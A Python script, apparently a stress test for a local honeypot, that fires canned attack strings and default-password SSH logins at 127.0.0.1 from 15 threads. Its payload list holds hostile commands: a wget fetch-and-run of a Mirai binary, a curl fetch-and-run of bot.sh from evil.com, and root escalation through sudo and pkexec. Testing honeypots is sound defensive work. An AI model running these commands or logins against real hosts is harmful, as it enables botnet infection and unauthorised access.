import socket
import paramiko
import threading
import time
import random
import urllib.request
import logging

logging.getLogger("paramiko").setLevel(logging.CRITICAL)

HOST = "127.0.0.1"

PAYLOADS = [
    ("nc", b"nmap -sV -p- localhost\n"),
    ("telnet", b"uname -a\n"),
    ("http", b"GET /phpmyadmin HTTP/1.1\r\n\r\n"),
    ("nc", b"wget http://192.168.1.1/mirai.mips -O -> /tmp/m; chmod +x /tmp/m; /tmp/m\n"),
    ("telnet", b"curl -O http://evil.com/bot.sh && sh bot.sh\n"),
    ("nc", b"sudo su -\n"),
    ("telnet", b"pkexec /bin/sh\n"),
]

def blast():
    for _ in range(25):
        svc, payload = random.choice(PAYLOADS)
        port = {"nc": 4444, "telnet": 2323, "http": 8080}[svc]
        try:
            with socket.socket() as s:
                s.settimeout(0.5)
                s.connect((HOST, port))
                s.sendall(payload)
                s.recv(1024)
        except:
            pass
        
        try:
            c = paramiko.SSHClient()
            c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            c.connect(HOST, port=2222, username="root", password=random.choice(["root", "12345", "admin", "admin123"]), timeout=1)
            c.close()
        except:
            pass
        
        time.sleep(random.uniform(0.05, 0.2))

print("Initiating 15 concurrent threads for hardcore stress test...")
threads = []
for _ in range(15):
    t = threading.Thread(target=blast)
    t.start()
    threads.append(t)

for t in threads:
    t.join()

print("Hardcore stress test complete! Hundreds of payloads dumped.")
